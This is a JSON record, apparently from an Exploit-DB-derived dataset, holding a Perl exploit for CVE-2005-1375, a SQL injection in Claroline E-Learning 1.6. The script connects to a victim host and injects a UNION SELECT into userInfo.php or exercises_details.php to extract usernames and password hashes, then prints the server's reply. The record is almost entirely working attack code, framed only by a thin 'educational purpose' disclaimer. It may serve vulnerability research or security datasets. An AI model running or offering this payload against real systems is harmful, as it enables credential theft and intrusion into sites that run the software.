{
  "id": "1053",
  "title": "Claroline E-Learning 1.6 - Remote Hash SQL Injection (2)",
  "cve": "CVE-2005-1375",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n# Claroline E-Learning Application Remote SQL Exploit\r\n# [K-C0d3r]\r\n# This tools and to consider only himself to educational purpose\r\n# Bug discovered by\r\n# Greetz to mZ, 2b TUBE, off, rikky, str0ke, x0n3-h4ck, MWC\r\n# [K-C0d3r]\r\n\r\nuse IO::Socket;\r\n\r\nsub Usage {\r\nprint STDERR \"Usage: KCcol-xpl.pl <www.victim.com> <path/dir> <target_num>\\n\";\r\nprint STDERR \"Targets:\\n1 - userInfo.php\\n\";\r\nprint STDERR \"2 - exercises_details.php\\n\";\r\nexit;\r\n}\r\n\r\nif (@ARGV < 3)\r\n{\r\n Usage();\r\n}\r\n\r\nif (@ARGV > 3)\r\n{\r\n Usage();\r\n}\r\n\r\nif (@ARGV == 3)\r\n{\r\n$host = @ARGV[0];\r\n$path = @ARGV[1];\r\n$target = @ARGV[2];\r\n\r\nprint \"[K-C0d3r]  Claroline E-Learning Application Remote SQL Exploit [K-C0d3r]\\n\";\r\nprint \"[+] Connecting to $host\\n\";\r\n\r\n$sqli = \"%20UNION%20SELECT%20pn_uname,null,pn_uname,pn_pass,pn_pass,null,pn_pass,null\";\r\n$sqli .= \"%20FROM%20pn_users%20WHERE%20pn_uid=2/*\";\r\n\r\n$socket = new IO::Socket::INET (PeerAddr => \"$host\",\r\n                                PeerPort => 80,\r\n                                Proto => 'tcp');\r\n                                die unless $socket;\r\n\r\nprint \"[+] Injecting command ...\\n\";\r\n\r\nif ($target == 1)\r\n{\r\nprint $socket \"GET http://$host/$path/userInfo.php?uInfo=-1$sqli HTTP/1.1\\nHost: $host\\n\\n Connection: Close\\r\\n\\r\\n\";\r\nwhile (<$socket>)\r\n{\r\n print $_;\r\n exit;\r\n}\r\n}\r\nif ($target == 2)\r\n{\r\nprint $socket \"GET http://$host/$path/exercises_details.php?uInfo=-1$sqli HTTP/1.1\\nHost: $host\\n\\n Connection: Close\\r\\n\\r\\n\";\r\nwhile (<$socket>)\r\n{\r\n print $_;\r\n exit;\r\n}\r\n}\r\n}\r\n\r\n# milw0rm.com [2005-06-19]",
  "url": "https://www.exploit-db.com/exploits/1053"
}